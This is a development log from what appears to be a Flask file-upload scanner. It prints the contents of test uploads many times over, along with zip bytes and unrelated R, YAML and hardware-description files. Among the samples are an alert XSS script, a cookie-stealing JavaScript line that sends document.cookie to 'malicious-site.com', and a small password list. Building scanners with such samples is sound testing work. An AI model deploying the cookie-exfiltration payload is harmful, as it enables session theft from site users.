2025-02-22 20:58:10,139 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,140 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,141 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,142 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,143 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,144 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,145 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,146 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,147 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,148 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,150 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,151 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,152 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,153 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,154 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,155 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,157 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,158 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,159 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,160 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,162 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,163 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,165 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,166 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,171 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:58:10,171 - [33mPress CTRL+C to quit[0m
2025-02-22 20:58:15,089 - 127.0.0.1 - - [22/Feb/2025 20:58:15] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:58:15,103 - 127.0.0.1 - - [22/Feb/2025 20:58:15] "GET / HTTP/1.1" 200 -
2025-02-22 20:58:22,661 - 127.0.0.1 - - [22/Feb/2025 20:58:22] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:58:22,668 - 127.0.0.1 - - [22/Feb/2025 20:58:22] "GET / HTTP/1.1" 200 -
2025-02-22 20:59:13,232 - Extracted content from uploads/flask_file_upload_2.zip: PK     șVZ               flask_file_upload/UT
 ԹgԹgԹgux     PK   VZ        /  *   flask_file_upload/create_malicious_xlsx.pyUT
 qԹgԹgԹgux     }RJ0}W\CZA|P0]Ň
e|YzaiRtI[MyJ=prɵ*@(]#ޔެA90⪠3*ji6 w.ࡅ{ƇJ~hen|"j^'YžXnF8 SjiTLI#ʫۖ?2p	9TtwI'4+$wh._ur?椉[*"b>XdeHNǠ?W̰PVjgiWڎz;s2jYILXTQRjm95<m
*TIV:
Ӽt2	#XS7'Z-DOVKͥ#1 xQd+!vIQ<3,û8PK  /  PK   VZ        '  &   flask_file_upload/metadata_analysis.pyUT
 z¹g¹gz¹gux     UQO0~ϯ8
2025-02-22 20:59:13,976 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 20:59:13,977 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:59:13,979 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:59:13,981 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:59:13,983 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:59:13,984 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:13,986 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:13,987 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:13,988 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:59:13,992 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:13,993 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:13,994 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:59:13,996 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:59:13,998 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:59:14,000 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:59:14,002 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,003 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,005 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,006 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:59:14,009 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,010 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,011 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:59:14,013 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:59:14,014 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:59:14,016 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:59:14,017 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,018 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,019 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,020 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:59:14,023 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,024 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,025 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,026 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,027 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,028 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:14,029 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,030 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,031 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,033 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,034 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,035 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:14,036 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,038 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,039 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,040 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:59:14,043 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,044 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:59:14,046 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:59:14,047 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:59:14,048 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:59:14,050 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:59:14,052 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,053 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,054 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,055 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:59:14,057 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,058 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,060 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:59:14,061 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:59:14,062 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:59:14,064 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:59:14,065 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,066 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:59:14,066 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:59:14,067 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:59:14,069 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:59:14,070 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:59:14,071 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:59:14,073 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
